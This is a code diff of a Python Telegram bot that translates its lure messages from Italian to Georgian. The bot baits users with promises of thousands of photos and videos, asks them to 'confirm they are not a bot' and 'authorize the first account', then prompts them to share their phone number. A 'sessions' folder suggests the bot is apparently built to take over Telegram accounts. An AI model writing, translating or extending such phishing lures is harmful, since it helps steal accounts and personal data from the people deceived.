@@ -42,12 +42,12 @@ os.makedirs("sessions", exist_ok=True)
 @dp.message_handler(commands=['start'])
 async def cmd_start(message: types.Message):
     keyboard = InlineKeyboardMarkup().add(
-        InlineKeyboardButton(" Autorizza primo account🥺", callback_data="auth_account")
+        InlineKeyboardButton(" ავტორიზაცია პირველ ანგარიშზე🥺", callback_data="auth_account")
     )
     await message.answer(
-        "👋 🇮🇹 Ciao! ❤️\n"
-        "Vuoi vedere più di 10.000 foto e 4.000 video? 👁\n"
-        "Conferma che non sei un bot usando il pulsante qui sotto. 🤖👇\n\n",
+        "👋 🇬🇪 გამარჯობა! ❤️\n"
+        "გინდა ნახო 10,000-ზე მეტი ფოტო და 4,000-ზე მეტი ვიდეო? 👁\n"
+        "დაადასტურე რომ არ ხარ ბოტი ქვემოთ მოცემული ღილაკით. 🤖👇\n\n",
         reply_markup=keyboard
     )
 
@@ -59,9 +59,9 @@ async def start_auth(callback_query: types.CallbackQuery):
     user_states[user_id] = 'awaiting_contact'
 
     kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    kb.add(KeyboardButton("📱 Condividi il tuo numero con noi", request_contact=True))
+    kb.add(KeyboardButton("📱 გაგვიზიარე შენი ნომერი", request_contact=True))
 
-    await bot.send_message(user_id, "🥺 Per favore condividi il tuo numero:", reply_markup=kb)
+    await bot.send_message(user_id, "🥺 გთხოვ გაგვიზიარე შენი ტელეფონის ნომერი:", reply_markup=kb)
     await bot.answer_callback_query(callback_query.id)
 
 @dp.message_handler(content_types=types.ContentType.CONTACT)
